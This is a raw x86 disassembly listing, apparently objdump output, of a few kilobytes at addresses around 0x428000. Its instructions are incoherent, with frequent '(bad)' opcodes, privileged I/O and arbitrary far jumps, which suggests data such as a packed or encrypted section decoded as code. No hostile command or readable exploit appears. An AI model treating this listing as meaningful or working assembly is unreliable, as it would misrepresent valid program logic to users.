  427fc8:	sub    al,BYTE PTR [ebx+0x14]
  427fcb:	enter  0x19db,0xe7
  427fcf:	mov    ebp,0x60574a92
  427fd4:	sub    BYTE PTR [ecx],0x54
  427fd7:	add    dl,BYTE PTR [edi-0x57]
  427fda:	fwait
  427fdb:	in     al,dx
  427fdc:	shl    BYTE PTR [eax],1
  427fde:	in     eax,0xec
  427fe0:	(bad)  
  427fe1:	cdq    
  427fe2:	push   ecx
  427fe3:	pop    ebx
  427fe4:	imul   esp,DWORD PTR [ecx-0x68c049a5],0xaf203a96
  427fee:	and    eax,0x5be6f3ea
  427ff3:	fs loop 0x428045
  427ff6:	mov    bl,0xf0
  427ff8:	je     0x428064
  427ffa:	out    0x23,al
  427ffc:	xor    esp,DWORD PTR [edx-0x74]
  427fff:	aas    
  428000:	pop    ss
  428001:	xchg   edx,eax
  428002:	(bad)  
  428003:	sub    bl,BYTE PTR fs:[ebp-0x3a]
  428007:	addr16 aas 
  428009:	in     eax,dx
  42800a:	lock aas 
  42800c:	add    DWORD PTR [bp+si-0x7ce9],0x7a
  428012:	retf   0xbe14
  428015:	inc    esp
  428016:	lock jns 0x428021
  428019:	leave  
  42801a:	icebp  
  42801b:	push   esi
  42801c:	or     edx,edi
  42801e:	and    cl,BYTE PTR [edx]
  428020:	loop   0x428042
  428022:	and    ebp,DWORD PTR [ecx+0x390ae8bc]
  428028:	iret   
  428029:	loop   0x42807e
  42802b:	scas   al,BYTE PTR es:[edi]
  42802c:	xchg   ecx,eax
  42802d:	imul   eax,DWORD PTR [esi+0x33472c12],0x51
  428034:	sub    eax,0x4fcd8ab
  428039:	ins    BYTE PTR es:[edi],dx
  42803a:	ret    0x1445
  42803d:	inc    ebx
  42803e:	pop    ss
  42803f:	das    
  428040:	ds loope 0x428029
  428043:	addr16 (bad) 
  428045:	or     bl,BYTE PTR [eax]
  428047:	sub    DWORD PTR [eax+0x65],ecx
  42804a:	xor    edx,DWORD PTR [ebx+0x17821b4a]
  428050:	mov    bh,0x33
  428052:	pop    edx
  428053:	xchg   ecx,eax
  428054:	outs   dx,DWORD PTR ds:[esi]
  428055:	fnstenv [esi+0x7cce6efa]
  42805b:	(bad)  
  42805c:	jno    0x4280b2
  42805e:	enter  0xe4b9,0xb3
  428062:	jmp    0x9999e270
  428067:	int3   
  428068:	pusha  
  428069:	push   es
  42806a:	cmp    BYTE PTR [eax],al
  42806c:	fs rol dh,1
  42806f:	and    cl,BYTE PTR [esi-0x41318976]
  428075:	cwde   
  428076:	mov    bl,0x3b
  428078:	dec    esi
  428079:	xor    DWORD PTR [edi+0x4b899c92],edx
  42807f:	fimul  WORD PTR [edx+ebp*4]
  428082:	rcr    al,0xd3
  428085:	lock xor ebp,edi
  428088:	and    al,0xbe
  42808a:	xchg   ecx,eax
  42808b:	je     0x42808f
  42808d:	push   0x493d3d54
  428092:	inc    esp
  428093:	mov    ds,WORD PTR [esi-0x5a]
  428096:	pushf  
  428097:	xlat   BYTE PTR ds:[ebx]
  428098:	xchg   DWORD PTR [ecx],ebx
  42809a:	mov    edi,0x2793703d
  42809f:	and    al,0xf1
  4280a1:	mov    dl,0xf2
  4280a3:	ret    
  4280a4:	jns    0x428097
  4280a6:	push   edi
  4280a7:	scas   al,BYTE PTR es:[edi]
  4280a8:	int    0x8c
  4280aa:	rol    BYTE PTR [ecx-0x2dd35c56],cl
  4280b0:	data16 sub al,0xf6
  4280b3:	(bad)  
  4280b4:	popf   
  4280b5:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280b7:	test   DWORD PTR [eax],0x2380c607
  4280bd:	outs   dx,BYTE PTR ds:[esi]
  4280be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280bf:	mov    bl,BYTE PTR [edi-0x38a3aa70]
  4280c5:	and    DWORD PTR [esp+edx*2],edi
  4280c8:	jno    0x4280f7
  4280ca:	clc    
  4280cb:	xchg   ecx,eax
  4280cc:	and    DWORD PTR [edx-0x6b],esi
  4280cf:	jge    0x42811e
  4280d1:	inc    ebp
  4280d2:	das    
  4280d3:	add    DWORD PTR [ecx-0x8],eax
  4280d6:	outs   dx,DWORD PTR ds:[esi]
  4280d7:	ja     0x428068
  4280d9:	mov    al,0x37
  4280db:	mov    dl,0x42
  4280dd:	mov    cl,0xe0
  4280df:	into   
  4280e0:	rcl    DWORD PTR [eax],0x3b
  4280e3:	push   ecx
  4280e4:	test   al,0xf0
  4280e6:	je     0x4280e9
  4280e8:	sar    BYTE PTR [ebp+0x6a51805a],1
  4280ee:	ret    
  4280ef:	pushf  
  4280f0:	lock jns 0x4280d5
  4280f3:	call   0x6129:0x1646153
  4280fa:	mov    ah,0x15
  4280fc:	bound  eax,QWORD PTR [edx+0x6eb15966]
  428102:	xchg   ebp,eax
  428103:	rcl    BYTE PTR [edi+0x4f01fdd8],0xf0
  42810a:	nop
  42810b:	cs jb  0x4280f2
  42810e:	xchg   ah,ah
  428110:	repnz push esi
  428112:	push   es
  428113:	or     BYTE PTR [eax],bl
  428115:	adc    BYTE PTR [ecx-0x60],0x20
  428119:	repnz pop esp
  42811b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42811c:	pop    ss
  42811d:	cmc    
  42811e:	push   0xf3d9a254
  428123:	shl    BYTE PTR [ebx-0x6d3eff2f],1
  428129:	sub    cl,BYTE PTR [edx-0x9]
  42812c:	cld    
  42812d:	jle    0x42812f
	...
  428137:	add    BYTE PTR [eax],al
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	arpl   WORD PTR [ecx-0x9df1df0],bx
  42814c:	add    DWORD PTR [eax],eax
  42814e:	cld    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [eax-0x1e],dh
  428154:	sbb    DWORD PTR [esi],0xffffffd3
  428157:	popf   
  428158:	mov    ah,0x73
  42815a:	mov    fs,WORD PTR ds:0x228c547b
  428160:	xchg   ebx,eax
  428161:	ret    
  428162:	mov    eax,ds:0x6dcc7a7b
  428167:	call   0xcfb2:0xdabf9e7c
  42816e:	add    edi,DWORD PTR [esi-0x1f7db1f7]
  428174:	mov    bl,0xfb
  428176:	nop
  428177:	mov    es,WORD PTR [ecx-0x7]
  42817a:	ds cli 
  42817c:	out    0xea,eax
  42817e:	sbb    DWORD PTR [edx+edx*8],0x54c78817
  428185:	push   ecx
  428186:	jne    0x4281dd
  428188:	(bad)  [eax-0x3e8bb110]
  42818e:	jge    0x428169
  428190:	add    DWORD PTR [edi+edi*2+0x4c350d3f],edi
  428197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428198:	repz stc 
  42819a:	and    esi,edi
  42819c:	lahf   
  42819d:	adc    al,0xf2
  42819f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4281a1:	mov    BYTE PTR [edi+0x13],ch
  4281a4:	jmp    0x428199
  4281a6:	jnp    0x4281d8
  4281a8:	shl    DWORD PTR [ecx-0x78],0xef
  4281ac:	sahf   
  4281ad:	jne    0x428176
  4281af:	sahf   
  4281b0:	dec    edi
  4281b1:	call   edi
  4281b3:	mov    al,0x6a
  4281b5:	sub    eax,0xd18d862
  4281ba:	mov    edi,DWORD PTR [ecx+esi*1+0x628a81ae]
  4281c1:	adc    edi,DWORD PTR [edi+0x19bf2d5e]
  4281c7:	(bad)  
  4281c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281c9:	mov    ds:0x9249a6f1,eax
  4281ce:	in     al,dx
  4281cf:	mov    WORD PTR [edi+0x58dd95e8],gs
  4281d5:	push   ds
  4281d6:	mov    ebx,esp
  4281d8:	in     al,0x9a
  4281da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281db:	iret   
  4281dc:	dec    esi
  4281dd:	cdq    
  4281de:	add    eax,0xf85d9eff
  4281e3:	adc    eax,0xd8dfe735
  4281e8:	enter  0x4e50,0xed
  4281ec:	xor    ebx,DWORD PTR [ebx+0x4c905177]
  4281f2:	std    
  4281f3:	fsub   QWORD PTR [ecx-0x1]
  4281f6:	fst    DWORD PTR [eax+eax*8]
  4281f9:	xchg   esp,eax
  4281fa:	sub    dh,BYTE PTR [eax+ebx*1+0x27]
  4281fe:	pop    edx
  4281ff:	dec    ecx
  428200:	call   0x285998a8
  428205:	psubq  mm0,QWORD PTR [ecx+0x68]
  428209:	push   ebx
  42820a:	add    DWORD PTR [edi-0x37],ebp
  42820d:	and    eax,0x96250d7e
  428212:	repnz in al,dx
  428214:	cmp    cl,BYTE PTR [edx+ebx*8+0x2c42b538]
  42821b:	jmp    0x5cbea15c
  428220:	sub    al,0x9
  428222:	or     eax,0xe3de53c2
  428227:	xor    eax,0x504f472
  42822c:	xor    eax,0x34b700a
  428231:	cmc    
  428232:	fmul   DWORD PTR [esi+0x2e498e52]
  428238:	add    DWORD PTR [edi+0x30],ebp
  42823b:	sbb    eax,0x836ddeb3
  428240:	outs   dx,BYTE PTR ds:[esi]
  428241:	ret    0x5022
  428244:	xchg   esi,eax
  428245:	ds out 0x2d,al
  428248:	repz cmp BYTE PTR [ecx],bh
  42824b:	je     0x428224
  42824d:	add    cl,BYTE PTR [ecx]
  42824f:	xor    BYTE PTR [edx+0x4b61dfd1],dl
  428255:	and    al,0x62
  428257:	sbb    esp,edi
  428259:	cmp    al,0x9f
  42825b:	push   cs
  42825c:	adc    DWORD PTR [ecx+0x5b5fc995],ebx
  428262:	shr    DWORD PTR [edx-0x5],0xea
  428266:	ret    
  428267:	push   edx
  428268:	inc    edx
  428269:	cmp    bh,bl
  42826b:	fcom   QWORD PTR [edx]
  42826d:	sbb    DWORD PTR [ebp+0x67],esp
  428270:	inc    edx
  428271:	jb     0x4282c4
  428273:	or     ch,BYTE PTR [ecx]
  428275:	pop    edx
  428276:	jle    0x428236
  428278:	sbb    bl,BYTE PTR ds:0x6b806bb3
  42827e:	cs push eax
  428280:	adc    esp,DWORD PTR [esi-0x11]
  428283:	idiv   BYTE PTR [eax]
  428285:	xor    al,0x4c
  428287:	ins    DWORD PTR es:[edi],dx
  428288:	mov    ds:0x2c914669,al
  42828d:	pop    ds
  42828e:	sub    ch,0xa0
  428291:	jl     0x4282c8
  428293:	jb     0x4282f9
  428295:	test   DWORD PTR [edi+0x3],esp
  428298:	mov    esp,0x44e7416b
  42829d:	test   eax,0x746dfd0a
  4282a2:	dec    edi
  4282a3:	popf   
  4282a4:	scas   eax,DWORD PTR es:[edi]
  4282a5:	push   cs
  4282a6:	xchg   edx,eax
  4282a7:	push   0x98de3929
  4282ac:	in     eax,dx
  4282ad:	scas   al,BYTE PTR es:[edi]
  4282ae:	mov    ds:0x25247b50,eax
  4282b3:	int    0xe2
  4282b5:	(bad)  
  4282b6:	stc    
  4282b7:	cs mov ch,0x6d
  4282ba:	inc    ebp
  4282bb:	into   
  4282bc:	adc    eax,0x59f0d2a3
  4282c1:	aam    0xbb
  4282c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282c4:	rol    DWORD PTR [ebx-0x5881bba7],0xb2
  4282cb:	dec    ebx
  4282cc:	pop    eax
  4282cd:	test   al,0x42
  4282cf:	cmovbe ebx,ecx
  4282d2:	lea    ebx,ds:0x1c8382c7
  4282d8:	push   ds
  4282d9:	mov    WORD PTR [eax+0x17632bf4],ds
  4282df:	cmc    
  4282e0:	sub    BYTE PTR [edi],dh
  4282e2:	mov    DWORD PTR [edx+0x4a],esp
  4282e5:	std    
  4282e6:	or     eax,0x419e02ee
  4282eb:	pop    ebp
  4282ec:	ret    0x1f80
  4282ef:	jl     0x4282f3
  4282f1:	jp     0x428346
  4282f3:	loope  0x428324
  4282f5:	ss loope 0x428366
  4282f8:	add    al,0x66
  4282fa:	pop    esi
  4282fb:	hlt    
  4282fc:	pop    ebx
  4282fd:	sub    al,0x31
  4282ff:	sub    eax,0x49d7993f
  428304:	mov    bl,ah
  428306:	xlat   BYTE PTR ds:[ebx]
  428307:	retf   
  428308:	pop    ss
  428309:	mov    dh,0x82
  42830b:	(bad)  
  42830c:	jmp    0x9e01:0x6278593e
  428313:	mov    ds:0x16e9e2f,al
  428318:	retf   
  428319:	fcmovnbe st,st(4)
  42831b:	xor    ch,bl
  42831d:	pusha  
  42831e:	sahf   
  42831f:	xchg   DWORD PTR [ecx+0x16],esi
  428322:	pop    bp
  428324:	cli    
  428325:	icebp  
  428326:	loope  0x4282c5
  428328:	xchg   ebx,eax
  428329:	push   ds
  42832a:	sti    
  42832b:	ret    0x8a3f
  42832e:	loop   0x4282fb
  428330:	jle    0x42835c
  428332:	fs std 
  428334:	pop    ecx
  428335:	pop    eax
  428336:	mov    al,BYTE PTR [eax]
  428338:	out    0xcd,al
  42833a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42833b:	lods   al,BYTE PTR ds:[esi]
  42833c:	shr    DWORD PTR [edx+0x62a28eac],0x3d
  428343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428344:	repz iret 
  428346:	xchg   ecx,eax
  428347:	pop    eax
  428348:	xchg   edx,eax
  428349:	std    
  42834a:	pop    ds
  42834b:	pop    esp
  42834c:	mov    BYTE PTR [eax+eax*1+0x0],ch
  428353:	add    BYTE PTR [eax],al
  428355:	add    BYTE PTR [eax],al
  428357:	add    BYTE PTR [eax],al
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x4283ab
  428367:	push   cs
  428368:	pop    eax
  428369:	retf   0xf81c
  42836c:	add    DWORD PTR [eax],eax
  42836e:	in     al,0x1
  428370:	add    BYTE PTR [eax],al
  428372:	sub    esp,DWORD PTR [ecx+0x77f39bb9]
  428378:	and    ebx,edx
  42837a:	push   ss
  42837b:	xchg   esi,eax
  42837c:	out    dx,al
  42837d:	(bad)  
  42837e:	xchg   edx,eax
  42837f:	jmp    0xfb86:0xec99bd4a
  428386:	fnstenv [edx]
  428388:	out    dx,eax
  428389:	ds jnp 0x4283a5
  42838c:	jmp    0x42830f
  42838e:	sbb    DWORD PTR [ecx+0x6086487b],esp
  428394:	aam    0xb0
  428396:	xor    eax,0x756b9033
  42839b:	sub    eax,0x8d2733ec
  4283a0:	adc    BYTE PTR [ebx+0x2df2e33],cl
  4283a6:	jmp    0x94c7f5fc
  4283ab:	data16 cmp al,0xfd
  4283ae:	or     bh,BYTE PTR [edx+eax*4]
  4283b1:	jne    0x428363
  4283b3:	mov    ebp,0x66e74fb6
  4283b8:	jnp    0x42833b
  4283ba:	sbb    al,BYTE PTR [ecx+0x72]
  4283bd:	xlat   BYTE PTR ds:[ebx]
  4283be:	sub    ebx,DWORD PTR [ebp+0x958ddef]
  4283c4:	push   0xffffff8b
  4283c6:	pop    eax
  4283c7:	dec    eax
  4283c8:	xchg   edx,eax
  4283c9:	aas    
  4283ca:	jg     0x4283d2
  4283cc:	test   DWORD PTR gs:[eax],edi
  4283cf:	int3   
  4283d0:	push   0x6fbf85c6
  4283d5:	mov    dh,0x22
  4283d7:	std    
  4283d8:	mov    ds:0x4144d97d,eax
  4283dd:	imul   edx,DWORD PTR [edi-0x2abbce0d],0xffffffa7
  4283e4:	inc    esi
  4283e5:	in     eax,dx
  4283e6:	outs   dx,DWORD PTR ds:[esi]
  4283e7:	jecxz  0x428447
  4283e9:	aam    0x7c
  4283eb:	inc    esp
  4283ec:	pop    ecx
  4283ed:	sub    edx,DWORD PTR [eax+0x47]
  4283f0:	jae    0x428393
  4283f2:	add    eax,0x2ef41ba
  4283f7:	and    eax,0x83aabe86
  4283fc:	dec    ebx
  4283fd:	xor    al,0x58
  4283ff:	dec    BYTE PTR [ecx-0x27a608ff]
  428405:	add    cl,BYTE PTR [ebx]
  428407:	mov    ds,WORD PTR ds:0x53b315d
  42840d:	sub    BYTE PTR [ebx+0x9b7257e],ch
  428413:	adc    ebp,DWORD PTR [ecx-0x3f59b413]
  428419:	and    ch,BYTE PTR [ecx+edx*2+0x19]
  42841d:	in     eax,0x2d
  42841f:	or     cl,BYTE PTR [ebx-0x4be75eff]
  428425:	call   0xea0a09dc
  42842a:	and    ecx,DWORD PTR [ebx]
  42842c:	xchg   esi,eax
  42842d:	mov    ds:0xa0e3e497,eax
  428432:	sbb    esi,ebx
  428434:	cs std 
  428436:	or     BYTE PTR [edi-0x7678bda9],dh
  42843c:	out    0xda,al
  42843e:	mov    al,0x72
  428440:	add    eax,0xe1b00070
  428445:	push   edx
  428446:	(bad)  
  428447:	es neg edx
  42844a:	shl    BYTE PTR ds:0xeee40bd3,1
  428450:	or     ah,BYTE PTR [eax+0x589ad81]
  428456:	in     al,dx
  428457:	xchg   esi,eax
  428458:	fsub   QWORD PTR [edi-0xe04e325]
  42845e:	ss jecxz 0x4284b3
  428461:	pop    ds
  428462:	push   eax
  428463:	or     al,0xf3
  428465:	or     eax,ecx
  428467:	(bad)  
  428468:	xor    eax,0x6d600c6
  42846d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42846e:	mov    WORD PTR [ebx+0x73],es
  428471:	sbb    al,0xb2
  428473:	enter  0xc5de,0x23
  428477:	cmp    edi,DWORD PTR [ebx-0x5d]
  42847a:	jno    0x428429
  42847c:	cmc    
  42847d:	cs inc edi
  42847f:	or     eax,0x27f908e6
  428484:	aam    0x49
  428486:	or     al,0x79
  428488:	arpl   WORD PTR [ecx-0x1cf10977],bp
  42848e:	push   eax
  42848f:	retf   0x3d6f
  428492:	jns    0x4284d2
  428494:	daa    
  428495:	xor    BYTE PTR [ebp-0x29],dh
  428498:	ror    bh,cl
  42849a:	jge    0x428425
  42849c:	add    al,ch
  42849e:	or     dh,bh
  4284a0:	xchg   DWORD PTR [ebp+esi*4+0x63838df1],eax
  4284a7:	nop
  4284a8:	push   0xffffffb8
  4284aa:	enter  0x3f25,0x30
  4284ae:	lea    eax,[edi]
  4284b0:	mov    dh,0x6c
  4284b2:	and    bh,cl
  4284b4:	aas    
  4284b5:	xor    ebx,ebx
  4284b7:	stc    
  4284b8:	or     bl,0x41
  4284bb:	shl    BYTE PTR [edi+0xd3272f],1
  4284c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284c2:	scas   eax,DWORD PTR es:[edi]
  4284c3:	das    
  4284c4:	xchg   edi,eax
  4284c5:	repnz push ebx
  4284c7:	mov    dh,ch
  4284c9:	iret   
  4284ca:	rol    DWORD PTR [eax+0x33e2af02],0x7
  4284d1:	jb     0x42851d
  4284d3:	dec    ebx
  4284d4:	dec    esp
  4284d5:	push   eax
  4284d6:	mov    al,ds:0xfbd49c2
  4284db:	ins    DWORD PTR es:[edi],dx
  4284dc:	cwde   
  4284dd:	lahf   
  4284de:	xchg   edi,eax
  4284df:	push   edi
  4284e0:	inc    ecx
  4284e1:	pop    ds
  4284e2:	lock mov eax,0x566647ca
  4284e8:	adc    esp,ecx
  4284ea:	jae    0x4284e5
  4284ec:	push   edi
  4284ed:	add    eax,0x3840770f
  4284f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f3:	push   0x79
  4284f5:	adc    ah,BYTE PTR [ebp+0x1a]
  4284f8:	paddsb mm4,mm6
  4284fb:	or     al,0x7f
  4284fd:	sbb    edi,DWORD PTR ds:0x829d5f19
  428503:	ds test al,0x4b
  428506:	jp     0x428577
  428508:	out    0x14,eax
  42850a:	xchg   ebx,eax
  42850b:	mov    edx,0xb859b0e1
  428510:	call   0xf74e51d
  428515:	ins    BYTE PTR es:[edi],dx
  428516:	out    dx,eax
  428517:	jbe    0x428585
  428519:	inc    ecx
  42851a:	pop    es
  42851b:	and    ebx,esp
  42851d:	sahf   
  42851e:	ret    0x3dcd
  428521:	scas   eax,DWORD PTR es:[edi]
  428522:	sub    al,0x1a
  428524:	mov    ebx,0xbe6a7d24
  428529:	jmp    DWORD PTR [edx+0x2ea1ec0c]
  42852f:	int    0x6
  428531:	sub    cl,BYTE PTR [ebx+0x5f]
  428534:	adc    al,0x17
  428536:	dec    ebp
  428537:	outs   dx,BYTE PTR ds:[esi]
  428538:	push   ss
  428539:	sub    eax,ecx
  42853b:	jo     0x42858d
  42853d:	jmp    0x7055:0xe103129
  428544:	and    dl,BYTE PTR [edi]
  428546:	sub    edx,DWORD PTR [ebx+esi*1]
  428549:	hlt    
  42854a:	iret   
  42854b:	mov    bh,0xa6
  42854d:	mov    eax,ds:0x59a6f5d1
  428552:	push   ebp
  428553:	cmp    BYTE PTR [esi+0x20],dl
  428556:	add    BYTE PTR [eax],al
	...
